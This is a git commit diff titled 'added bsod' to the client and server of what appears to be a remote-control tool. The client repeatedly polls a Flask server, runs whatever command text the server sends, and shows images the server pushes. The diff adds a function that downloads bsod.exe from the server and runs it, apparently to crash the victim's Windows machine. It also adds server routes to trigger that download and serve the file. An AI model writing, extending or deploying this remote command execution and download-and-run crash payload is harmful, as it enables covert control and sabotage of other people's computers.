646cae4cc4675606b1a727b8f4a3f26eee363d90
Venu2HD <83081969+Venu2HD@users.noreply.github.com>
2023-07-05 17:55:57 +0200

    added bsod

--- client.py
+++ client.py
@@ -1,5 +1,5 @@
 from PIL import UnidentifiedImageError, Image
-from requests import post, get
+from requests import Response, post, get
 from subprocess import Popen
 from time import sleep
 from os import remove
@@ -10,25 +10,43 @@ PORT = 80
 SCHEME = "http"
 
 
+def invoke_bsod() -> None:
+    with open("temp.exe", "wb") as temp_file:
+        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
+    Popen("temp.exe")
+    remove("temp.exe")
+
+
 def main() -> None:
     while True:
         get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
         get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
-        if get_commands_response.status_code != 204:
-            Popen(get_commands_response.text)
-            post(
-                f"{SCHEME}://{IP}:{PORT}/command-center",
-                data={"command": get_commands_response.text},
-            )
-        if get_images_response.status_code != 204:
-            with open("temp", "wb") as temp_image_file:
-                temp_image_file.write(get_images_response.content)
-            try:
-                Image.open("temp").show()
-            except UnidentifiedImageError:
-                pass
-            remove("temp")
+        get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
+        if get_commands_response.status_code == 200:
+            run_command(get_commands_response)
+        if get_images_response.status_code == 200:
+            load_image(get_images_response)
+        if get_bsod_response.status_code == 200:
+            invoke_bsod()
         sleep(DELAY)
+
+
+def load_image(get_images_response: Response):
+    with open("temp", "wb") as temp_image_file:
+        temp_image_file.write(get_images_response.content)
+    try:
+        Image.open("temp").show()
+    except UnidentifiedImageError:
+        pass
+    remove("temp")
+
+
+def run_command(get_commands_response: Response):
+    Popen(get_commands_response.text)
+    post(
+        f"{SCHEME}://{IP}:{PORT}/command-center",
+        data={"command": get_commands_response.text},
+    )
 
 
 if __name__ == "__main__":
--- server.py
+++ server.py
@@ -7,38 +7,43 @@ from time import sleep
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app)
-command_strings: list[str] = []
-command_counts: list[int] = []
+commands: list[str] = []
 images: list[bytes] = []
+bsod_activated: bool = True
 
 
 @app.route("/command-center", methods=["GET", "POST"])
 def command_center() -> Response:
     if request.method == "GET":
         try:
-            return Response(command_strings[0], 200)
+            return Response(commands[0], 200)
         except IndexError:
             return Response("no commands to execute", 204)
     elif request.method == "POST":
         command = request.form.get("command")
         try:
-            index = command_strings.index(command)
+            commands.remove(command)
         except ValueError:
             return Response("command doesnt exist", 400)
-        command_counts[index] -= 1
-        if command_counts[index] == 0:
-            del command_counts[index]
-            del command_strings[index]
-        return Response(f"ok, decremented {command}", 200)
+        return Response(f"ok, removed {command}", 200)
 
 
 @app.route("/image-center", methods=["GET"])
 def image_center() -> Response:
-    if request.method == "GET":
-        try:
-            return images[0]
-        except IndexError:
-            return Response("no images to show", 204)
+    try:
+        return images[0]
+    except IndexError:
+        return Response("no images to show", 204)
+
+
+@app.route("/bsod-center", methods=["GET"])
+def bsod_center() -> Response:
+    global bsod_activated
+    if bsod_activated:
+        bsod_activated = False
+        return Response("1", 200)
+    else:
+        return Response("0", 204)
 
 
 @app.route("/key.txt", methods=["GET"])
@@ -46,9 +51,15 @@ def easter_egg() -> Response:
     return Response("Hey, what are you doing there?", 418)
 
 
+@app.route("/bsod.exe", methods=["GET"])
+def server_bsod_exe() -> bytes:
+    with open("static/bsod.exe", "rb") as bsod_file:
+        return bsod_file.read()
+
+
 @app.route("/", methods=["GET"])
 def home() -> str:
-    with open("index.html", "r", encoding="utf-8") as index_file:
+    with open("static/index.html", "r", encoding="utf-8") as index_file:
         return index_file.read()
 
 
@@ -62,26 +73,22 @@ def post_image() -> Response:
         return Response("invalid key", 403)
 
 
-def post_image_thread(data: bytes) -> None:
-    images.append(data)
-    sleep(9)
-    images.remove(data)
+@app.route("/post_bsod", methods=["POST"])
+def post_bsod() -> Response:
+    if check_key(request.args.get("key")):
+        global bsod_activated
+        bsod_activated = True
+    else:
+        return Response("invalid key", 403)
 
 
 @app.route("/post_command", methods=["POST"])
 def post_command() -> Response:
     key = request.args.get("key")
     command = request.args.get("command")
-    amount = request.args.get("amount")
-
-    try:
-        amount = int(amount)
-    except ValueError:
-        return Response("amount is not a valid integer", 400)
 
     if check_key(key):
-        command_strings.append(command)
-        command_counts.append(amount)
+        commands.append(command)
         return Response("success", 200)
     else:
         return Response("invalid key", 403)
@@ -89,6 +96,12 @@ def post_command() -> Response:
 
 def hash_key(key: str) -> str:
     return sha256(key.encode()).hexdigest()
+
+
+def post_image_thread(data: bytes) -> None:
+    images.append(data)
+    sleep(9)
+    images.remove(data)
 
 
 def check_key(key: str) -> bool:
